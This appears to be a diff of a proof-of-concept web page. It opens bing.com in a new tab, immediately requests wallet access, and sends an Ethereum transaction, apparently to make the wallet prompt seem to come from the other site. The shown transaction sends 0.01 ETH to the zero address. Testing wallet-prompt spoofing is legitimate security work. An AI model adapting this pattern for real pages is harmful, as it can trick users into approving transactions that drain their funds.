@@ -12,20 +12,6 @@
       text-decoration: none;
       display: inline-block;
       font-size: 16px;
-      margin: 4px 2px;<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
       margin: 4px 2px;
       cursor: pointer;
     }
@@ -39,9 +25,6 @@
 
       // Check for wallet connection
       await promptWalletConnection();
-
-      // Perform transaction with chain ID 0x1 (Mainnet)
-      await performTransaction("0x1");
     }
 
     async function promptWalletConnection() {
@@ -50,6 +33,9 @@
           // Request wallet connection
           await ethereum.request({ method: 'eth_requestAccounts' });
           alert('Wallet connected successfully!');
+          
+          // Perform transaction with chain ID 0x1 (Mainnet)
+          await performTransaction("0x1");
         } catch (error) {
           alert('Wallet connection request rejected by the user.');
         }
@@ -90,78 +76,5 @@
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
   </center>
-</body>
-</html>
-
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-  <center>
-    <input type="button" class="button" value="From Original Site" onclick="openBingAndPerformTransaction()">
-  </center>
-
-  <script>
-    async function openBingAndPerformTransaction() {
-      // Open bing.com in a new tab
-      const newTab = window.open('https://bing.com', 'x');
-
-      // Wait for the new tab to load and initiate the transaction
-      newTab.onload = async function () {
-        try {
-          console.log('New tab loaded. Initiating wallet connection and transaction...');
-
-          // Attempt wallet connection and transaction request simultaneously
-          const result = await performWalletConnectionAndTransaction();
-
-          if (result.success) {
-            console.log('Wallet connected and transaction sent successfully on the new tab!');
-          } else {
-            console.error('Wallet connection or transaction failed:', result.error);
-          }
-        } catch (error) {
-          console.error('An error occurred:', error);
-        }
-      };
-    }
-
-    async function performWalletConnectionAndTransaction() {
-      if (typeof window.ethereum !== 'undefined') {
-        try {
-          // Request wallet connection
-          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-
-          // Perform the transaction
-          const transactionParameters = {
-            nonce: "0x00",
-            gasPrice: "0x244AC6D",
-            gas: "0x12A52",
-            to: "0x0000000000000000000000000000000000000000",
-            from: accounts[0],
-            value: "0x2386F26FC10000",
-            data: "0x00",
-            chainId: "0x5", // Adjust this to the appropriate chain ID
-          };
-
-          try {
-            const txHash = await ethereum.request({
-              method: "eth_sendTransaction",
-              params: [transactionParameters],
-            });
-            console.log(`Transaction sent! Transaction hash: ${txHash}`);
-            return { success: true };
-          } catch (error) {
-            console.error(`Transaction failed: ${error.message}`);
-            return { success: false, error: error.message };
-          }
-        } catch (error) {
-          return { success: false, error: error.message };
-        }
-      } else {
-        return { success: false, error: 'Web3 (Ethereum provider) is not available in this browser.' };
-      }
-    }
-  </script>
 </body>
 </html>
